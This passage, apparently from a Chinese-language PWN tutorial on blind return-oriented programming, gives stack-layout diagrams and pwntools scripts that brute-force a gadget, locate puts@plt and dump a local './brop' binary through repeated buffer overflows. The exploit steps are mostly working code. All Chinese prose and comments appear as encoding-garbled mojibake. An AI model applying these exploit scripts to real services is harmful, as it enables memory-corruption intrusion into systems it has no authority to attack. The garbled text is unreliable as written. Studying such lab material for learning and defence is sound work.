class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºæ˜¯å¦å´©æºƒæ¥åˆ¤æ–­probeæ¢é’ˆä¸­å¯èƒ½å­˜åœ¨çš„æ±‡ç¼–è¯­å¥ï¼Œåœ¨è¿™æ ·å¸ƒå±€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å´©æºƒï¼Œè¯´æ˜stop gadgetè¢«æ‰§è¡Œäº†ã€‚<strong>è¯´æ˜äº†probeæ¢é’ˆä¸­æ²¡æœ‰popæ“ä½œï¼Œå¹¶ä¸”æœ‰retè¿”å›</strong>ï¼Œå¦‚æœæœ‰popæ“ä½œçš„è¯stopä¼šè¢«popè¿›å¯„å­˜å™¨å½“ä¸­ï¼Œé‚£ä¹ˆprobeæ¢é’ˆçš„retè¿”å›å°±ä¼šæŒ‡å‘stopçš„åå‡ ä½trapsï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚é‚£ä¹ˆç”±äºåœ¨æ ˆå¸ƒå±€ä¸­stop gadgetåœ¨probeæ¢é’ˆçš„ä¸‹ä¸€ä½ï¼Œè¯´æ˜stopæ‰€åœ¨ä½ç½®å°±æ˜¯probeæ¢é’ˆçš„retè¿”å›åœ°å€ä½ç½®ã€‚å¦‚ï¼š<pre class="line-numbers language-C" data-language="C"><code class="language-C">retxor eax,eax; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>probe, traps, stop, rapsä»¥è¿™æ ·çš„æ–¹å¼è¿›è¡Œæ’åˆ—ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹åœ¨æ ˆä¸­çš„æ’åˆ—<pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+ |          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           ....            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           stop            | &lt;----- stop gadgetï¼Œä¸ä¼šä½¿ç¨‹åºå´©æºƒï¼Œä½œä¸ºprobeçš„retä½+---------------------------+|          trap             | &lt;----- trapï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|          probe            | &lt;----- æ¢é’ˆ-----------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºæ˜¯å¦å´©æºƒæ¥åˆ¤æ–­probeæ¢é’ˆä¸­å¯èƒ½å­˜åœ¨çš„æ±‡ç¼–è¯­å¥ï¼Œåœ¨è¿™æ ·å¸ƒå±€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å´©æºƒï¼Œè¯´æ˜stop gadgetè¢«æ‰§è¡Œäº†ã€‚è¯´æ˜probeæŒ‡é’ˆä¸­ä»…å­˜åœ¨ä¸€ä¸ªpopæ“ä½œï¼Œå¹¶ä¸”æœ‰retè¿”å›ï¼Œåœ¨probeæ¢é’ˆä¸­åªæœ‰ä¸€ä¸ªpopæ“ä½œçš„æ—¶å€™æ‰ä¼šåªå°†probeåé¢çš„trapå¼¹è¿›å¯„å­˜å™¨ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªåŠä¸¤ä¸ªä»¥ä¸Šçš„popæ“ä½œçš„æ—¶å€™ï¼Œstop gadgetä¹Ÿä¼šè¢«å¼¹è¿›å¯„å­˜å™¨ä¸­æ— æ³•æ‰§è¡Œã€‚å¹¶ä¸”åœ¨probeæ¢é’ˆä¸­retè¿”å›æ‰€æŒ‡çš„ä½ç½®æ˜¯stopæ‰èƒ½ä½¿ç¨‹åºä¸å´©æºƒï¼Œå¦‚ï¼š<pre class="line-numbers language-C" data-language="C"><code class="language-C">pop rax; retpop rdi; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>probe, trap, trap, trap, trap, trap, trap, stop, trapsä»¥è¿™æ ·çš„æ–¹å¼è¿›è¡Œæ’åˆ—ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹åœ¨æ ˆä¸­çš„æ’åˆ—<pre class="line-numbers language-python" data-language="python"><code class="language-python">+---------------------------+ |           traps           | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+ |           stop            | &lt;----- stop gadgetï¼Œä¸ä¼šä½¿ç¨‹åºå´©æºƒï¼Œä½œä¸ºprobeçš„retä½+---------------------------+ |           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           trap            | &lt;----- trapï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ+---------------------------+|           probe           | &lt;----- æ¢é’ˆ-----------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºæ˜¯å¦å´©æºƒæ¥åˆ¤æ–­probeæ¢é’ˆä¸­å¯èƒ½å­˜åœ¨çš„æ±‡ç¼–è¯­å¥ï¼Œåœ¨è¿™æ ·å¸ƒå±€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å´©æºƒï¼Œè¯´æ˜stop gadgetè¢«æ‰§è¡Œäº†ã€‚è¯´æ˜è¯¥probeæ¢é’ˆä¸­å­˜åœ¨6ä¸ªpopæ“ä½œï¼Œå¹¶ä¸”æœ‰retï¼Œå› ä¸ºåªæœ‰åœ¨6ä¸ªpopæ“ä½œä¹‹åprobeåé¢çš„trapæ‰èƒ½å¼¹è¿›å¯„å­˜å™¨ï¼Œä¹‹åspæŒ‡é’ˆæ‰èƒ½æŒ‡å‘stop gadgetï¼Œè¿™ä¸ªæ—¶å€™stop gadgetåªæœ‰åœ¨retä½ç½®æ‰èƒ½è¢«æ‰§è¡Œï¼Œå› æ­¤ç¨‹åºä¸ä¼šå´©æºƒ<br>å›åˆ°æˆ‘ä»¬ä¹‹é—´è¯´çš„å¯»æ‰¾brop gadgetç¯èŠ‚ï¼Œæˆ‘ä»¬è¿™ä¸ªç¯èŠ‚è¦æ‰¾çš„å°±æ˜¯libc_csu_initæœ€åçš„6ä¸ªpopåŠ retï¼Œé‚£ä¹ˆæ ¹æ®å‰é¢çš„è®²è§£æˆ‘ä»¬å¯ä»¥å¤§è‡´çš„é€šè¿‡trapã€stopè¿™ç§æ–¹å¼åšä¸€ä¸ªç®€å•çš„æ’åˆ—ï¼š<br>addrï¼Œtrap, trap, trap, trap, trap, trap, stop, traps<br>ä»¥ä¸Šé¢è¿™ç§æ’åˆ—çš„è¯ï¼Œaddré€šè¿‡å¾ªç¯ä¸æ–­å¢åŠ åœ°å€ä½ï¼Œåªæœ‰addræ‰€åœ¨åœ°å€æ‹¥æœ‰6ä¸ªpopæ“ä½œå¹¶retçš„æ—¶å€™æ‰ä¼šæ‰§è¡Œstopgadgetã€‚</li></ul><p><strong>å¾ªç¯å†…å®¹ï¼šé€’å¢åœ°å€ï¼Œæ‰¾åˆ°å¯ä»¥æ‰§è¡Œ6ä¸ªpopå’Œä¸€ä¸ªretæ“ä½œçš„gadget</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šç¨‹åºä¸å´©æºƒï¼Œå¹¶å‡ºç°èµ·å§‹çš„è¾“å‡ºæç¤ºâ€™WelComeâ€™å­—ç¬¦</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šæ‰¾åˆ°libc_csu_initå‡½æ•°çš„æœ€åä¸€ä¸ªgadgetï¼Œé€šè¿‡åç§»è®¡ç®—å‡ºpopr diåœ°å€</strong><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *def get_brop_gadget(length, stop_gadget, addr): #æŸ¥æ‰¾brop gadgetå‡½æ•°    try:        sh &#x3D; process(&#39;.&#x2F;brop&#39;)        sh.recvuntil(b&#39;password?\n&#39;)        payload &#x3D; b&#39;a&#39; * length + p64(addr) + p64(0)*6 + p64(stop_gadget)         sh.sendline(payload)        content &#x3D; sh.recv()        sh.close()        print (content)        if not content.startswith(b&#39;WelCome&#39;):          #åˆ¤æ–­æç¤ºç¬¦æ˜¯å¦å‡ºç°èµ·å§‹æç¤ºå­—ç¬¦ï¼Œå¦‚æœæœ‰è¯´æ˜ç¨‹åºæ²¡å´©æºƒ            return False        return True    except Exception:        sh.close()        return Falsedef check_brop_gadget(length, addr):#æ£€æŸ¥åœ°å€    try:        sh &#x3D; process(&#39;.&#x2F;brop&#39;)        sh.recvuntil(b&#39;password?\n&#39;)        payload &#x3D; b&#39;a&#39; * length + p64(addr) + b&#39;a&#39; * 8 * 10        sh.sendline(payload)        content &#x3D; sh.recv()        sh.close()        return False    except Exception:        sh.close()        return True##length &#x3D; getbufferflow_length()length &#x3D; 72##get_stop_addr(length)stop_gadget &#x3D; 0x4005d0addr &#x3D; 0x4007b0 #ç†è®ºä¸Šåº”è¯¥ä»0x400000å¼€å§‹å¯»æ‰¾ï¼Œä½†æ˜¯è¿™ä¸ªç¯èŠ‚è¦æ‰¾çš„æ˜¯Libc_csu_initå‡½æ•°ï¼Œæ‰€ä»¥å¤§å¤šæ•°çš„libcä¸­Libc_csu_initå‡½æ•°çš„èµ·å§‹åœ°å€éƒ½åœ¨0x400750ä¹‹åï¼Œæ‰€ä»¥ä¸ºäº†å‡å°‘è¯¯å·®ï¼Œä»0x400750å¼€å§‹while 1:  #å¾ªç¯é€’å¢è¦æµ‹è¯•çš„åœ°å€    print (hex(addr))    if get_brop_gadget(length, stop_gadget, addr):        print (&#39;possible brop gadget: 0x%x&#39; % addr)        if check_brop_gadget(length, addr):            print (&#39;success brop gadget: 0x%x&#39; % addr)            break    addr +&#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206210120.png" alt="Pasted image 20250206210120"></p><p>è¿è¡Œä¹‹åä¼šå¾—åˆ°å¾ˆå¤šçš„gadgetåœ°å€ï¼Œä½†æ˜¯åªæœ‰0x4007baæ˜¯å¯ä»¥ç»§ç»­è¿›è¡Œæ“ä½œçš„ï¼Œå¦‚æœæƒ³æ‰¾åˆ°æ›´å¤šçš„gadgetåœ°å€å¯ä»¥å‚è€ƒå¯»æ‰¾stop gadgetæ–¹æ³•ã€‚<br>æ ˆä¸­å¸ƒå±€</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">             +---------------------------+             |        0           | trap             +---------------------------+             |          .....           | trap             +---------------------------+             |        0           | trap             +---------------------------+             |       stop gadget        | stop gadgetä½œä¸ºretè¿”å›åœ°å€             +---------------------------+             |        0           | trap             +---------------------------+             |        0           | trap             +---------------------------+             |        0           | trap             +---------------------------+             |        0           | trap             +---------------------------+             |        0           | trap             +---------------------------+             |        0           | trap             +---------------------------+             |         0x400740+         | é€’å¢åœ°å€è¦†ç›–åŸretè¿”å›ä½ç½®             +---------------------------+             |             a             | aå­—ç¬¦ä¸²è¦†ç›–åŸsaved ebpä½ç½®      ebp---&gt;+---------------------------+             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |           ....            |        .....             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´ebp-ï¼Ÿ--&gt;+---------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æˆ‘ä»¬æ‰¾åˆ°brop gadgetä¹‹ååŠ ä¸Š0x09çš„åç§»å°±å¯ä»¥å¾—åˆ°pop rdiï¼›retæ“ä½œçš„åœ°å€0x4007c3</p><h5 id="4-å¯»æ‰¾puts-pltåœ°å€"><a href="#4-å¯»æ‰¾puts-pltåœ°å€" class="headerlink" title="4.å¯»æ‰¾puts@pltåœ°å€"></a>4.å¯»æ‰¾puts@pltåœ°å€</h5><p>é€šè¿‡å‰é¢çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸€äº›è§„å¾‹ï¼Œæ¯”å¦‚æˆ‘ä»¬éœ€è¦ä»€ä¹ˆå°±æŠŠä»–æ‰”è¿›å¾ªç¯é€’å¢ï¼Œæ€»ä¼šæœ‰ä¸€æ¬¡å¾ªç¯ä¼šå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œåœ¨ä¸Šä¸€æ­¥æˆ‘ä»¬æ‰¾åˆ°äº†pop rdiï¼›retè¿™ä¸ªgadgetçš„åœ°å€äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶putså‡½æ•°çš„è¾“å‡ºå†…å®¹ã€‚æˆ‘ä»¬å°±éœ€è¦ç”¨è¿™ä¸ªgadgetæ‰¾åˆ°puts_pltçš„åœ°å€<br>æ ¹æ®ä¸Šé¢æ‰€è¯´çš„å¦‚æœæˆ‘ä»¬è°ƒç”¨putså‡½æ•°ï¼Œå¿…é¡»å°†putså‡½æ•°çš„å‚æ•°åœ°å€å…ˆéƒ¨ç½²è¿›rdiå¯„å­˜å™¨ä¸­ï¼Œç„¶åè°ƒç”¨putså‡½æ•°å°†rdiä¸­åœ°å€å†…çš„å‚æ•°æ‰“å°å‡ºæ¥<br>ä½†æ˜¯ç”±äºå¼€å¯äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åœ¨æ ˆä¸­éƒ¨ç½²å¤–éƒ¨çš„å˜é‡æˆ–è€…å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªç¨‹åºå†…éƒ¨çš„ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¿™ä¸ªå­—ç¬¦ä¸²å¿…é¡»å”¯ä¸€çš„ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹ï¼Œåœ¨æ²¡æœ‰å¼€å¯PIEä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œ0x400000å¤„ä¸ºELFæ–‡ä»¶çš„å¤´éƒ¨ï¼Œå…¶å†…å®¹ä¸ºâ€™ \ x7fELFâ€™</p><p><strong>å¾ªç¯å†…å®¹ï¼šé€’å¢åœ°å€ï¼Œæ‰¾åˆ°å¯ä»¥è¿›è¡Œæ‰“å°çš„puts_pltåœ°å€</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šæ¥æ”¶å­—ç¬¦ä¸²å‡ºç°â€™\ x7fELFâ€™å­—æ ·</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šä¸ºåç»­æ‰¾åˆ°puts_gotåœ°å€åšå‡†å¤‡</strong><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">def get_puts_addr(length, rdi_ret, stop_gadget):    addr &#x3D; 0x400559    while 1:        print (hex(addr))        sh &#x3D; process(&#39;.&#x2F;brop&#39;)        sh.recvuntil(b&#39;password?\n&#39;)        payload &#x3D; b&#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)#72ä¸ªAå¡«å……æ ˆç©ºé—´ï¼Œè°ƒç”¨pop rdiï¼›ret gadgetå°†0x400000popè¿›rdiå¯„å­˜å™¨ï¼Œå¾ªç¯å¢é•¿çš„åœ°å€æ”¾åœ¨gadgetçš„retä½ç½®ï¼Œåœ¨æ‰§è¡Œå®Œgadgetåç›´æ¥è°ƒç”¨å¾ªç¯å¢é•¿çš„åœ°å€ï¼Œå¦‚æœå¢é•¿åˆ°puts_pltåœ°å€å°±ä¼šæ‰“å°rdiå¯„å­˜å™¨ä¸­åœ°å€å†…å­˜æ”¾çš„å­—ç¬¦ä¸²ï¼Œæœ€åçš„stop gadgetæ˜¯ä¸ºäº†è®©ç¨‹åºä¸å´©æºƒ        sh.sendline(payload)        try:            content &#x3D; sh.recv()            if content.startswith(b&#39;\x7fELF&#39;):#åˆ¤æ–­æ˜¯å¦æ‰“å°\x7fELF                print (&#39;find puts@plt addr: 0x%x&#39; % addr)                return addr            sh.close()            addr +&#x3D; 1        except Exception:            sh.close()            addr +&#x3D; 1##length &#x3D; getbufferflow_length()length &#x3D; 72rdi_ret &#x3D; 0x4007ba+0x9##get_stop_addr(length)stop_gadget &#x3D; 0x4005d0puts &#x3D; get_puts_addr(length,rdi_ret,stop_gadget)#find puts@plt addr: 0x400565<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206211035.png" alt="Pasted image 20250206211035"><br>æ ˆä¸­å¸ƒå±€</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">             +---------------------------+             |       stop gadget        | stop gadgetç¡®ä¿ç¨‹åºä¸å´©æºƒ             +---------------------------+             |       0x400000+        | å¾ªç¯é€’å¢åœ°å€ï¼Œä½œä¸ºpopçš„retåœ°å€             +---------------------------+             |        0x400000        | ELFèµ·å§‹åœ°å€ï¼Œåœ°å€å†…å­˜æ”¾&#39;ã€x7fELF&#39;             +---------------------------+             |          0x4007c3         | pop rdiï¼›retåœ°å€è¦†ç›–åŸretè¿”å›ä½ç½®             +---------------------------+             |             a             | aå­—ç¬¦ä¸²è¦†ç›–åŸsaved ebpä½ç½®      ebp---&gt;+---------------------------+             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |           ....            |        .....             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´ebp-ï¼Ÿ--&gt;+---------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="5-æ³„éœ²puts-gotåœ°å€"><a href="#5-æ³„éœ²puts-gotåœ°å€" class="headerlink" title="5.æ³„éœ²puts_gotåœ°å€"></a>5.æ³„éœ²puts_gotåœ°å€</h5><p>åœ¨å¾—åˆ°puts_pltåœ°å€åï¼Œæ¥ä¸‹æ¥å°±éœ€è¦å°†puts_gotåœ°å€æ³„éœ²å‡ºæ¥ï¼Œå¾—åˆ°puts_gotåœ°å€ä¹‹åå°±å¯ä»¥åˆ©ç”¨LibcSearcheræŸ¥æ‰¾å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œå†æ ¹æ®ç‰ˆæœ¬æ‰¾åˆ°libcä¸­çš„systemå‡½æ•°å’Œ/bin/sh</p><p>åœ¨æ³„éœ²ä¹‹å‰éœ€è¦çŸ¥é“ä¸€ä¸‹Linuxä¸­pltè¡¨å’Œgotè¡¨çš„å…³ç³»ï¼Œæˆ‘ä»¬å°±æ‹¿putså‡½æ•°ä¸¾ä¾‹<br><pre class="line-numbers language-none"><code class="language-none">+--------------+|    GOTè¡¨     |+---------------------+   +--------------+æ‰¾åˆ°çœŸå®åœ°å€   +--------------+|  PLTè¡¨  | jmp gotè¡¨  |-----&gt; |putsçš„çœŸå®åœ°å€ | -------------&gt;|    putså‡½æ•°   |+---------------------+   +--------------+  +--------------+è·³è½¬åˆ°gotè¡¨ä¸­å­˜æ”¾puts              |              | å‡½æ•°çœŸå®åœ°å€çš„åœ°å€          | | |  | |         | |     | +--------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸Šå›¾æˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸‹call putsçš„è¿‡ç¨‹ï¼Œåœ¨æ‰§è¡Œcall putsä¹‹åç¨‹åºé¦–å…ˆä¼šåœ¨PLTè¡¨ä¸­å¯»æ‰¾puts_pltçš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨puts_pltåœ°å€ä¸­å­˜æ”¾çš„æ˜¯GOTè¡¨ä¸­å­˜æ”¾putså‡½æ•°çœŸå®åœ°å€çš„åœ°å€ï¼Œæ¥ä¸‹æ¥ä¼šåœ¨GOTè¡¨ä¸­æ‰¾åˆ°å­˜æ”¾putsçœŸå®åœ°å€çš„åœ°å€ï¼Œæ¥ä¸‹æ¥æ‰“å¼€ç›’å­æ ¹æ®çœŸå®æ‰¾åˆ°äº†putså‡½æ•°<br>åœ¨ret2csuä¸­æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯LibcSearcheræŸ¥æ‰¾çš„å‡½æ•°gotè¡¨åœ°å€ï¼Œé‚£ä¹ˆç”±äºè¿™é“é¢˜å¼€å¯äº†ASLRï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨å·¥å…·å»è·å–åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰‹åŠ¨çš„å»æ‰¾ï¼Œæ‰¾çš„å°±æ˜¯åœ¨puts_pltåœ°å€ä¸­å­˜æ”¾çš„jmpæŒ‡ä»¤åæ¥çš„åœ°å€ã€‚å¦‚æœè§‰å¾—ä¸æ‡‚ï¼Œçœ‹ä¸€ä¸‹ä¸Šé¢çš„å›¾ï¼ŒjmpæŒ‡ä»¤åé¢æ¥çš„å°±æ˜¯puts_gotçš„åœ°å€ã€‚ç”±äºä¸èƒ½å®ç”¨å·¥å…·ï¼Œæˆ‘ä»¬åªèƒ½æ‰‹åŠ¨çš„è®²æ•´ä¸ªPLTéƒ¨åˆ†éƒ½dumpå‡ºæ¥ã€‚dumpå‡ºæ¥çš„æ–‡ä»¶é‡æ–°è®¾ç½®åŸºåœ°å€0x400000ï¼Œå†æ ¹æ®å‰é¢å¾—åˆ°çš„puts_pltåœ°å€æ‰¾åˆ°å¯¹åº”ä½ç½®ï¼ŒæŸ¥çœ‹è¯¥åœ°å€å†…çš„æ±‡ç¼–æŒ‡ä»¤<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">context.log_level &#x3D; &quot;debug&quot;&#39;&#39;&#39;dump the bin file&#39;&#39;&#39;def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):    sh &#x3D; process(&#39;.&#x2F;brop&#39;)    payload &#x3D; b&#39;a&#39; * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)#72ä¸ªaå¡«æ»¡æ ˆç©ºé—´è‡³retä½ç½®ï¼Œåæ¥pop rdiï¼›ret gadgetï¼Œå¾ªç¯é€’å¢çš„åœ°å€è¢«popè¿›rdiå¯„å­˜å™¨ï¼Œæ¥ä¸‹æ¥å°†puts_pltåœ°å€é˜²æ­¢åœ¨gadget retä½ç½®è¿›è¡Œè°ƒç”¨æ‰“å°å¾ªç¯é€’å¢çš„åœ°å€ï¼Œæœ€ååŠ ä¸Šstop gadgeté˜²æ­¢å´©æºƒ    sh.recvuntil(b&#39;password?\n&#39;)    sh.sendline(payload)    try:        data &#x3D; sh.recv(timeout&#x3D;0.1)        sh.close()        try:            data &#x3D; data[:data.index(b&quot;\nWelCome&quot;)]#å°†æ¥æ”¶çš„\nWelComeä¹‹å‰çš„å­—ç¬¦ä¸²äº¤ç»™dataå˜é‡        except Exception:            data &#x3D; data        if data &#x3D;&#x3D; b&quot;&quot;: #å¦‚æœdataè¢«èµ‹å€¼ä¹‹åä¸ºç©ºï¼Œé‚£ä¹ˆå°±è¯´æ˜å·²ç»å®Œæˆæ•´ä¸ªdumpè¿‡ç¨‹ï¼Œæ·»åŠ \x00æˆªæ–­            data &#x3D; b&#39;\x00&#39;        return data    except Exception:        sh.close()        return None##length &#x3D; getbufferflow_length()length &#x3D; 72##stop_gadget &#x3D; get_stop_addr(length)stop_gadget &#x3D; 0x4005d0##brop_gadget &#x3D; find_brop_gadget(length,stop_gadget)brop_gadget &#x3D; 0x4007bardi_ret &#x3D; brop_gadget + 9##puts_plt &#x3D; get_puts_plt(length, rdi_ret, stop_gadget)puts_plt &#x3D; 0x400565addr &#x3D; 0x400000result &#x3D; b&quot;&quot; #å‡†å¤‡ä¸€ä¸ªç©ºå­—ç¬¦ä¸²æ¥æ”¶dumpå‡ºæ¥çš„ä»£ç while addr &lt; 0x401000:   #ä»0x400000å¼€å§‹æ³„éœ²0x1000ä¸ªå­—èŠ‚ï¼Œè¶³ä»¥åŒ…å«ç¨‹åºçš„pltéƒ¨åˆ†    print (hex(addr))    data &#x3D; leak(length, rdi_ret, puts_plt, addr, stop_gadget)    if data is None: #åˆ¤æ–­æ¥æ”¶å­—ç¬¦æ˜¯å¦ä¸ºç©º        result +&#x3D; b&#39;\x00&#39;        addr +&#x3D;1        continue    else:        result +&#x3D; data #æ¥æ”¶å­—ç¬¦ä¸²    addr +&#x3D; len(data)  #addr+æ¥æ”¶å­—ç¬¦ä¸²ä¸ªæ•°ï¼Œé¿å…æ¥æ”¶é‡å¤çš„å­—ç¬¦ä¸²with open(&#39;dump&#39;, &#39;wb&#39;) as f:  #åœ¨å½“å‰ç›®å½•ä¸‹ä»¥äºŒè¿›åˆ¶å½¢å¼å‘hollkæ–‡ä»¶ä¸­å†™    f.write(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>ä¸ªæ–‡ä»¶å°±æ˜¯æˆ‘ä»¬dumpå‡ºæ¥çš„æ–‡ä»¶ï¼Œå…¶å®ä½ 